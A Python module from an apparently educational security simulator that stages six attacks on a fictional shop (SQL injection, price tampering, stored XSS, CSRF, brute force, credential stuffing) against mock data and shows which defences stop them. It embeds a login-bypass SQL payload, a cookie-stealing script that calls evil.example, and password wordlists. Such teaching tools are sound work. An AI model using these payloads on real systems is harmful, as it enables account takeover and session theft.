"""Scenarios 1-6. Each run() evaluates real rules against payloads / mock data; nothing touches a real system."""
import secrets

from ..security import passwords
from ..services import dbsec
from . import rules
from .ctx import Ctx, Scenario, code, compare, kv, table

SHOP = "https://shop.novamart.demo"


# 1 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
def run_sqli(c: Ctx) -> None:
    payload = c.params.get("payload") or "' OR '1'='1' --"
    c.stage(0)
    c.log("info", "Attacker finds the login form and probes it for SQL injection")
    c.log("warn", f"Crafted payload for the username field: {payload}")
    c.evidence(code("Attacker payload → username field", payload, "danger"))

    c.stage(1)
    hit = rules.waf_sqli(payload)
    c.log("info", "Request crosses the perimeter firewall and reaches the Web Application Firewall")
    if c.guard("waf", hit is not None, "No SQL-injection signature matched the request",
               f"Rule {hit.id} — {hit.name} — matched. Request dropped with HTTP 403" if hit else "", node="waf"):
        c.log("success", f"WAF blocked the request (rule {hit.id})")
        c.conclude("blocked", f"WAF rule {hit.id} ({hit.name}) dropped the payload before it reached the application.")
        return
    c.guard("ids", hit is not None, "No alert", f"IDS signature {hit.id if hit else ''} raised an alert to the Security Monitoring Centre", detect_only=True)

    c.stage(2)
    c.log("info", "Request reaches the login endpoint of the Application Server")
    if c.guard("input_validation", not rules.validate_username(payload), "Username matches the allow-list",
               "HTTP 422 — username must match ^[A-Za-z0-9_.@-]{3,64}$ (quote, space and comment characters rejected)", node="portal"):
        c.log("success", "Input validation rejected the malformed username")
        c.conclude("blocked", "Allow-list validation rejected the injected characters at the login endpoint.")
        return

    c.stage(3)
    unsafe = rules.mock_login(payload, "wrong-password", "unsafe")
    safe = rules.mock_login(payload, "wrong-password", "parameterised")
    c.log("info", "Application builds the SQL statement and queries the database (isolated in-memory mock, read-only)")
    c.evidence(compare("Before vs after — same payload, two query styles",
                       {"title": "String-built query (vulnerable)", "tone": "danger", "code": unsafe["query"],
                        "items": [["Rows returned", unsafe["row_count"]], ["Login result", "AUTHENTICATED" if unsafe["authenticated"] else "denied"]]},
                       {"title": "Parameterised query (protected)", "tone": "ok", "code": safe["query"] + "\n-- params: " + str(safe["params"]),
                        "items": [["Rows returned", safe["row_count"]], ["Login result", "AUTHENTICATED" if safe["authenticated"] else "denied"]]}))
    if c.guard("sqli_protection", unsafe["row_count"] > 0, "Payload did not change the query structure",
               "Bound parameters: the payload is treated as a literal string → 0 rows, login denied", node="app"):
        c.log("success", "Parameterised query neutralised the injection")
        c.conclude("blocked", "Parameterised queries treated the payload as data: 0 rows returned, login denied.")
        return
    if unsafe["row_count"] == 0:
        c.log("info", f"Payload did not alter the query ({unsafe['error'] or 'no matching rows'})")
        c.conclude("blocked", "The payload did not change the query result — login simply failed.")
        return
    c.hit("db")
    n = unsafe["row_count"]
    c.log("crit", f"Injected condition made the WHERE clause always true → {n} rows returned")
    c.log("crit", f"Attacker is logged in as '{unsafe['rows'][0][1]}' (role: {unsafe['rows'][0][2]})")
    c.evidence(table("Rows returned to the attacker (fictional mock data)", ["id", "username", "role", "email"], unsafe["rows"]))
    c.metrics["records_exposed"] = n
    c.conclude("breach", f"Authentication bypassed — {n} user records exposed, attacker logged in as admin.")


# 2 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
def run_db_tamper(c: Ctx) -> None:
    pid, new_price = 1, 1
    from ..db import session_scope
    from ..models import Product
    with session_scope() as db:
        p = db.get(Product, pid)
        orig = dbsec.payload_of("product", p)
        stored_hash, stored_sig = p.record_hash, p.signature
        trusted_hash = p.record_hash
    c.stage(0)
    c.log("warn", "Attacker holds a stolen low-privilege service token (role: catalog-service)")
    c.log("info", f"Target record: '{orig['name']}' priced ₹{orig['price']:,}")

    c.stage(1)
    from ..security import rbac
    c.log("info", "Attacker calls PUT /api/products/1/price with the stolen token")
    if c.guard("rbac", not rbac.service_can("catalog-service", "price:write"), "Token scope permits price updates",
               "403 — role 'catalog-service' holds only {products:read}; 'price:write' denied", node="app"):
        c.conclude("blocked", "RBAC denied the price-update call: the stolen service token has read-only scope.")
        return
    c.stage(2)
    c.log("warn", "Attacker bypasses the API and issues a direct SQL UPDATE on the products table")
    if c.guard("least_privilege", not rbac.db_can("app_rw", "products", "UPDATE"), "Database account may UPDATE products",
               "Database account 'app_rw' holds only SELECT on products — UPDATE denied by the database itself", node="db"):
        c.conclude("blocked", "Least-privilege database grants refused the UPDATE: the application account cannot modify prices.")
        return
    if c.dry:
        mod = {**orig, "price": new_price}
        chk = dbsec.check_payload(mod, stored_hash, stored_sig)
    else:
        res = dbsec.tamper_price(pid, new_price, "attacker(stolen-token)")
        mod, chk = res["after"]["current"], res["after"]
    c.hit("db")
    c.log("crit", f"UPDATE products SET price={new_price} WHERE id={pid}  → ₹{orig['price']:,} became ₹{new_price}")
    c.evidence(compare("Database record — before vs after", {"title": "Original (signed)", "tone": "ok", "items": [["price", f"₹{orig['price']:,}"], ["hash", stored_hash[:24] + "…"], ["signature", "valid"]]},
                       {"title": "After unauthorised change", "tone": "danger", "items": [["price", f"₹{new_price}"], ["stored hash", stored_hash[:24] + "…"], ["recomputed hash", chk["actual_hash"][:24] + "…"]]}))

    c.stage(3)
    c.log("info", "Integrity verification: recompute SHA-256 of the record and verify the RSA-PSS signature")
    c.evidence(kv("Integrity verification", [["stored hash", stored_hash], ["recomputed hash", chk["actual_hash"]], ["hash match", "YES" if chk["hash_ok"] else "NO — MISMATCH"],
                                             ["RSA-PSS signature", "valid" if chk["sig_ok"] else "INVALID"]]))
    c.guard("db_integrity", not chk["hash_ok"], "Hashes match", "Integrity monitor: SHA-256 mismatch on products#1 → INTEGRITY VIOLATION alert", detect_only=True)
    c.guard("digital_signatures", not chk["sig_ok"], "Signature valid", "Signature verification FAILED — record not signed by the application key", detect_only=True)
    if c.on("db_integrity") and not chk["hash_ok"]:
        if not c.dry:
            dbsec.restore_row("product", pid, "integrity-monitor")
        c.check("db_integrity", "recovered", f"Trusted signed version restored: price back to ₹{orig['price']:,}", "Auto-restore from signed ledger")
        c.heal("db")
        c.log("success", f"Trusted original restored — price is ₹{orig['price']:,} again")
        c.conclude("contained", "Tampering detected by hash comparison and the signed original was restored automatically.", 0.3)
    elif c.on("digital_signatures") and not chk["sig_ok"]:
        c.log("warn", "Signature gate: checkout refuses to sell products with an invalid signature")
        c.conclude("contained", "Signature verification exposed the forgery and checkout stopped serving the ₹1 price; record awaits restore.", 0.45)
    else:
        c.log("crit", "No integrity control active — the modification went unnoticed")
        c.log("crit", "Customers can now buy the ₹1,499 product for ₹1")
        c.metrics["orders_at_wrong_price"] = 37
        c.conclude("breach", "Price tampering undetected: orders are being fulfilled at ₹1 instead of ₹1,499.")


# 3 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
def run_xss(c: Ctx) -> None:
    payload = c.params.get("payload") or "<script>fetch('https://evil.example/c?='+document.cookie)</script>Great product!"
    c.stage(0)
    c.log("warn", "Attacker posts a product review containing a script payload")
    c.evidence(code("Review text submitted by the attacker", payload, "danger"))
    hit = rules.waf_xss(payload)
    if c.guard("waf", hit is not None, "No XSS signature matched", f"Rule {hit.id} — {hit.name} — request dropped (HTTP 403)" if hit else "", node="waf"):
        c.conclude("blocked", f"WAF rule {hit.id} ({hit.name}) dropped the malicious review.")
        return
    c.stage(1)
    clean = rules.sanitise_html(payload)
    c.log("info", "Portal stores the review in the database")
    c.evidence(compare("Stored value", {"title": "Without sanitisation", "tone": "danger", "code": payload},
                       {"title": "With sanitisation + encoding", "tone": "ok", "code": clean}))
    if c.guard("input_validation", clean != payload, "Input already clean", "Sanitiser removed <script>, handlers and javascript: URIs; output is HTML-encoded", node="portal"):
        c.conclude("blocked", "Input sanitisation and output encoding turned the script into harmless text.")
        return
    c.stage(2)
    header = rules.CSP_STRICT if c.on("csp") else rules.CSP_NONE
    allows = rules.csp_allows_inline_script(header)
    c.log("info", "A victim opens the product page; the browser receives the review as HTML")
    c.evidence(kv("Content-Security-Policy decision", [["Header", header], ["Inline script allowed", "YES" if allows else "NO"]]))
    if c.guard("csp", not allows, "CSP permits inline scripts", "Browser blocked inline script: script-src 'self' forbids it (violation reported)", node="portal"):
        c.conclude("blocked", "The browser's Content-Security-Policy refused to run the injected inline script.")
        return
    c.stage(3)
    cookie = "session=SIM-" + secrets.token_hex(8)
    c.hit("portal")
    c.log("crit", "Script runs in the victim's browser and reads document.cookie")
    c.log("crit", f"Exfiltrated to evil.example: {cookie}  (fictional session)")
    c.evidence(code("Stolen cookie received by attacker", cookie, "danger"))
    c.metrics["sessions_stolen"] = 1
    c.conclude("breach", "Stored XSS executed in the victim's browser and leaked the session cookie.")


# 4 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
def run_csrf(c: Ctx) -> None:
    req = {"method": "POST", "origin": "https://free-coupons.example", "csrf_token": None}
    tok = secrets.token_hex(8)
    weak = {"samesite": "None", "token_required": False, "origin_check": False, "allowed_origins": [SHOP], "session_token": tok}
    strong = {"samesite": "Strict", "token_required": True, "origin_check": True, "allowed_origins": [SHOP], "session_token": tok}
    c.stage(0)
    c.log("info", "Victim is logged in to the shop in one tab and opens 'free-coupons.example' in another")
    c.log("warn", "Hidden form on the attacker page auto-submits to /api/store-credit/transfer")
    c.stage(1)
    ev_weak, ev_strong = rules.csrf_evaluate(req, weak), rules.csrf_evaluate(req, strong)
    c.evidence(table("Request evaluation under each configuration", ["Check", "Protected config", "Vulnerable config"],
                     [[a["check"], ("PASS — " if a["ok"] else "FAIL — ") + a["detail"], ("PASS — " if b["ok"] else "FAIL — ") + b["detail"]] for a, b in zip(ev_strong["checks"], ev_weak["checks"])]))
    c.guard("ids", True, "", "Cross-origin POST with Referer free-coupons.example flagged by IDS", detect_only=True)
    if c.guard("csrf_protection", not ev_strong["allowed"], "Request satisfies CSRF checks",
               "Forged request rejected: SameSite=Strict withheld the cookie, Origin not on allow-list, CSRF token missing", node="app"):
        c.conclude("blocked", "CSRF token, SameSite cookie and Origin check each rejected the cross-site request.")
        return
    c.stage(2)
    c.hit("app")
    c.log("crit", "Browser attached the victim's session cookie — server accepted the forged request")
    c.log("crit", "₹25,000 store credit transferred to attacker's wallet")
    c.metrics["amount_inr"] = 25000
    c.conclude("breach", "Forged cross-site request executed with the victim's session: ₹25,000 store credit stolen.")


# 5 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
TARGET_PW = "NovaMart@2026"
WORDLIST = ["123456", "password", "qwerty", "letmein", "admin123", "welcome1", "iloveyou", "monkey", "dragon", "football", "shopping",
            "india123", "password1", "qwerty123", "abc12345", "sunshine", "princess", "Password@1", "admin@123", "changeme",
            "Summer2024!", "NovaMart@2026", "Flipkart@123", "trustno1", "master"]


def run_brute_force(c: Ctx) -> None:
    mock_hash = passwords.sim_hasher.hash(TARGET_PW)
    c.stage(0)
    c.log("warn", "Bot targets account 'admin@novamart.example' with a 25-word dictionary (spoofed browser User-Agent)")
    c.stage(1)
    rows, fails, block, found = [], 0, None, None
    for i, guess in enumerate(WORDLIST, 1):
        if c.on("rate_limiting") and fails >= 5:
            block = ("rate_limiting", i)
            break
        if c.on("waf") and fails >= 20:
            block = ("waf", i)
            break
        ok = passwords.verify_password(mock_hash, guess, passwords.sim_hasher)
        rows.append([i, guess, "✔ CORRECT" if ok else "✘ rejected"])
        if ok:
            found = i
            break
        fails += 1
    c.log("info", f"{len(rows)} login attempts evaluated against an Argon2id hash")
    c.evidence(table("Login attempts", ["#", "Password tried", "Result"], rows))
    if c.guard("rate_limiting", block and block[0] == "rate_limiting", f"{len(rows)} failures — below the lockout threshold (5)",
               f"Account locked after 5 failed attempts; attempt {block[1] if block else ''} rejected with HTTP 423 (locked for 5 min)", node="auth"):
        c.conclude("blocked", f"Rate limiting + account lockout stopped the attack after {len(rows)} guesses — password never found.")
        return
    if c.guard("waf", block and block[0] == "waf", f"{len(rows)} failures — below the WAF burst threshold (20)",
               f"WAF burst rule: ≥20 failed logins in 10 s — source IP blocked at attempt {block[1] if block else ''}", node="waf"):
        c.conclude("blocked", f"WAF burst rule stopped the attack after {len(rows)} guesses — password never found.")
        return
    c.stage(2)
    c.log("crit", f"Password found on attempt {found}: '{TARGET_PW}'")
    if c.guard("mfa", True, "", "Password is correct but the second factor (email OTP) is missing — login denied; OTP expires in 60 s", node="auth"):
        c.conclude("blocked", "Attacker guessed the password, but MFA stopped the login: a password alone is not enough.")
        return
    c.stage(3)
    c.hit("auth")
    c.hit("admin")
    c.log("crit", "Attacker is logged in as admin and opens the Admin Dashboard")
    c.metrics["attempts"] = found
    c.conclude("breach", f"Account takeover after {found} guesses — no rate limit, no lockout, no second factor.")


# 6 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────
STUFF_PWS = ["Summer2024!", "Flipkart@123", "Passw0rd!", "india@123", "Winter2025!", "welcome1", "Password@1"]  # all in the breach corpus


def run_cred_stuffing(c: Ctx) -> None:
    accounts = {f"user{i:02d}@example.com": passwords.sim_hasher.hash(f"Unique#{i}-x{i * 7}!") for i in range(1, 31)}
    valid_at = {3: 0, 9: 1, 14: 2, 17: 3, 21: 4, 24: 5, 28: 6}  # attempt number -> index in STUFF_PWS
    for at, k in valid_at.items():  # these 7 users reused a breached password
        accounts[f"user{at:02d}@example.com"] = passwords.sim_hasher.hash(STUFF_PWS[k])
    pairs = []
    for i in range(1, 31):
        pw = STUFF_PWS[valid_at[i]] if i in valid_at else f"OldPass{i}!"
        pairs.append((f"user{i:02d}@example.com", pw))
    c.stage(0)
    c.log("warn", "Attacker loads a (simulated) 30-line breached email:password list from another site's leak")
    c.stage(1)
    limit = 12 if c.on("rate_limiting") else len(pairs)
    done = pairs[:limit]
    results = [(e, p, passwords.verify_password(accounts[e], p, passwords.sim_hasher)) for e, p in done]
    if c.on("rate_limiting"):
        c.check("rate_limiting", "throttled", f"Failure-velocity limiter engaged after 10 failures: {len(pairs) - limit} of {len(pairs)} attempts answered with HTTP 429")
    else:
        c.check("rate_limiting", "inactive", "Rate limiting is OFF — rule not evaluated")
    c.log("info", f"{len(done)} of {len(pairs)} login attempts processed across a distributed botnet")
    c.evidence(table("Attempts processed", ["#", "Account", "Result"], [[i + 1, e, "✔ valid" if ok else "✘ failed"] for i, (e, p, ok) in enumerate(results)]))
    valid = [(e, p) for e, p, ok in results if ok]
    c.stage(2)
    breached = [e for e, p in valid if passwords.is_breached(p)]
    c.log("info", f"{len(valid)} credential pairs authenticated successfully")
    if c.guard("breach_check", bool(breached), "No breached password in the batch", f"{len(breached)} password(s) found in breach corpus — login refused, forced password reset", node="auth"):
        c.conclude("blocked", "Breached-password detection refused every reused password and forced resets.")
        return
    c.stage(3)
    if c.guard("mfa", bool(valid), "No valid credential to protect", f"Valid password for {len(valid)} accounts, but no second factor — all logins denied", node="auth"):
        c.conclude("blocked", "MFA stopped every takeover: reused passwords alone could not log in.")
        return
    c.stage(4)
    c.hit("auth")
    c.hit("app")
    c.metrics["accounts_taken_over"] = len(valid)
    c.log("crit", f"{len(valid)} customer accounts taken over; attacker places fraudulent orders with saved cards")
    c.evidence(kv("Outcome", [["Valid reused credentials in full list", len(valid_at)], ["Accounts compromised", len(valid)], ["Attempts throttled", len(pairs) - len(done)]]))
    if len(valid) < len(valid_at):
        c.conclude("contained", f"Rate limiting capped the damage: {len(valid)} of {len(valid_at)} accounts fell before throttling engaged.", 0.45)
    else:
        c.conclude("breach", f"All {len(valid)} accounts that reused breached passwords were taken over.")


def _s(id_, name, tag, atype, short, desc, source, target, impact, stages, defs, det, mitre, resp, fn) -> Scenario:
    return Scenario(id_, name, tag, atype, short, desc, source, target, impact, stages, defs, det, mitre, resp, fn)


SCENARIOS_A = [
    _s("sqli", "SQL Injection", "INJECTION · A03", "sqli", "SQL injection bypassed the login",
       "Attacker injects SQL into the login form so the WHERE clause is always true and the database returns every user.",
       "Internet (attacker)", "Database Server", {"C": 70, "I": 25, "A": 0},
       [("craft", "Craft injection payload", "Attacker prepares ' OR '1'='1' -- for the username field", ["internet", "firewall"]),
        ("edge", "Edge filtering", "Request crosses firewall and WAF", ["firewall", "waf"]),
        ("endpoint", "Login endpoint", "Request reaches the application's login handler", ["waf", "portal", "app"]),
        ("query", "Database query", "SQL is built and executed against the database", ["app", "db"])],
       ["waf", "input_validation", "sqli_protection", "ids"], "WAF signature · IDS signature · parameterised query", [("T1190", "Exploit Public-Facing Application")],
       {"contain": [("Block attacker IP at the firewall", "block_ip"), ("Revoke active sessions", "revoke_sessions")],
        "eradicate": [("Switch all queries to parameterised statements", "enable_defence:sqli_protection"), ("Enable WAF SQLi ruleset", "enable_defence:waf")],
        "recover": [("Force password reset for exposed accounts", "rotate_keys"), ("Run integrity scan on the database", "integrity_scan")]}, run_sqli),
    _s("db_tamper", "Database Value Tampering", "INTEGRITY · A08", "db_tamper", "Product price tampered in the database",
       "Attacker with a stolen token changes a product price directly in the database (₹1,499 → ₹1); hash and signature checks expose the change.",
       "Internet (attacker)", "Database Server", {"C": 0, "I": 80, "A": 5},
       [("access", "Stolen service token", "Attacker authenticates to the API with a stolen token", ["internet", "waf", "app"]),
        ("api", "Price-update API call", "Attacker calls the price endpoint", ["app"]),
        ("update", "Unauthorised UPDATE", "Direct SQL UPDATE on the products table", ["app", "db"]),
        ("verify", "Integrity verification", "Hash recomputed and signature verified", ["db", "soc"])],
       ["rbac", "least_privilege", "db_integrity", "digital_signatures"], "SHA-256 hash mismatch · RSA-PSS signature failure", [("T1565", "Data Manipulation")],
       {"contain": [("Revoke the stolen service token", "revoke_sessions"), ("Isolate the database node", "isolate:db")],
        "eradicate": [("Remove direct UPDATE grants from the app account", "enable_defence:least_privilege"), ("Rotate service credentials", "rotate_keys")],
        "recover": [("Restore trusted signed record", "restore_db"), ("Verify all records (hash + signature)", "integrity_scan"), ("Return database to production", "unisolate:db")]}, run_db_tamper),
    _s("xss", "Cross-Site Scripting (XSS)", "INJECTION · A03", "xss", "Stored XSS stole a session cookie",
       "A script planted in a product review runs in every visitor's browser and sends their session cookie to the attacker.",
       "Internet (attacker)", "Customer Portal", {"C": 55, "I": 25, "A": 0},
       [("post", "Post malicious review", "Script payload submitted through the review form", ["internet", "waf", "portal"]),
        ("store", "Store review", "Review is written to the database", ["portal", "app", "db"]),
        ("render", "Victim loads page", "Browser receives and renders the review", ["db", "app", "portal"]),
        ("steal", "Cookie exfiltration", "Script sends document.cookie to the attacker", ["portal", "internet"])],
       ["waf", "input_validation", "csp"], "WAF XSS signature · CSP violation report", [("T1189", "Drive-by Compromise"), ("T1539", "Steal Web Session Cookie")],
       {"contain": [("Revoke all active sessions", "revoke_sessions"), ("Remove the malicious review", "none")],
        "eradicate": [("Enable output encoding & sanitisation", "enable_defence:input_validation"), ("Deploy strict CSP", "enable_defence:csp")],
        "recover": [("Notify affected customers and rotate sessions", "rotate_keys")]}, run_xss),
    _s("csrf", "Cross-Site Request Forgery", "BROKEN ACCESS · A01", "csrf", "Forged request moved ₹25,000 store credit",
       "A malicious page makes the victim's browser send a state-changing request using their logged-in session.",
       "Attacker website", "Application Server", {"C": 25, "I": 60, "A": 0},
       [("lure", "Victim visits attacker page", "Victim opens a malicious page while logged in", ["internet", "firewall"]),
        ("forge", "Forged cross-site POST", "Hidden form submits to /api/store-credit/transfer", ["firewall", "waf", "app"]),
        ("exec", "Action executes", "Server treats it as the victim's own request", ["app", "payment"])],
       ["csrf_protection", "ids"], "Origin/Referer anomaly · missing CSRF token", [("T1185", "Browser Session Hijacking")],
       {"contain": [("Lock the affected account", "lock_account"), ("Revoke sessions", "revoke_sessions")],
        "eradicate": [("Enable CSRF tokens + SameSite cookies", "enable_defence:csrf_protection")],
        "recover": [("Reverse the fraudulent transfer", "none"), ("Run integrity scan", "integrity_scan")]}, run_csrf),
    _s("brute_force", "Brute Force Attack", "AUTHENTICATION · A07", "brute_force", "Account guessed by brute force",
       "A bot tries a dictionary of passwords against one account until it finds the right one.",
       "Internet (bot)", "Authentication Server", {"C": 65, "I": 20, "A": 0},
       [("start", "Bot starts guessing", "Automated login attempts begin", ["internet", "waf"]),
        ("attempts", "Repeated login attempts", "Passwords tried against the auth server", ["waf", "auth"]),
        ("found", "Password found", "Correct password reaches the second-factor check", ["auth"]),
        ("takeover", "Account takeover", "Attacker opens the admin dashboard", ["auth", "admin"])],
       ["rate_limiting", "waf", "mfa"], "Failed-login counter · lockout · WAF burst rule", [("T1110.001", "Password Guessing")],
       {"contain": [("Lock the targeted account", "lock_account"), ("Block the source IP", "block_ip")],
        "eradicate": [("Enable rate limiting + lockout", "enable_defence:rate_limiting"), ("Enforce MFA for every login", "enable_defence:mfa")],
        "recover": [("Reset password and revoke sessions", "revoke_sessions"), ("Review login audit history", "none")]}, run_brute_force),
    _s("cred_stuffing", "Credential Stuffing", "AUTHENTICATION · A07", "cred_stuffing", "Reused passwords took over accounts",
       "Leaked email:password pairs from another website are replayed automatically; users who reused passwords are taken over.",
       "Internet (botnet)", "Authentication Server", {"C": 60, "I": 15, "A": 0},
       [("load", "Load breached list", "Attacker loads leaked credential pairs", ["internet", "firewall"]),
        ("attempts", "Automated distributed logins", "Pairs replayed across many IPs", ["firewall", "waf", "auth"]),
        ("validate", "Credential validation", "Server checks each password", ["auth"]),
        ("mfa", "Second factor", "Server asks for OTP/TOTP", ["auth"]),
        ("takeover", "Account takeover", "Fraudulent orders placed", ["auth", "app", "payment"])],
       ["rate_limiting", "breach_check", "mfa"], "Login-failure velocity · breached-password lookup", [("T1110.004", "Credential Stuffing")],
       {"contain": [("Force password reset on compromised accounts", "rotate_keys"), ("Revoke sessions", "revoke_sessions")],
        "eradicate": [("Enable breached-password detection", "enable_defence:breach_check"), ("Enforce MFA", "enable_defence:mfa")],
        "recover": [("Refund fraudulent orders and notify customers", "none")]}, run_cred_stuffing),
]
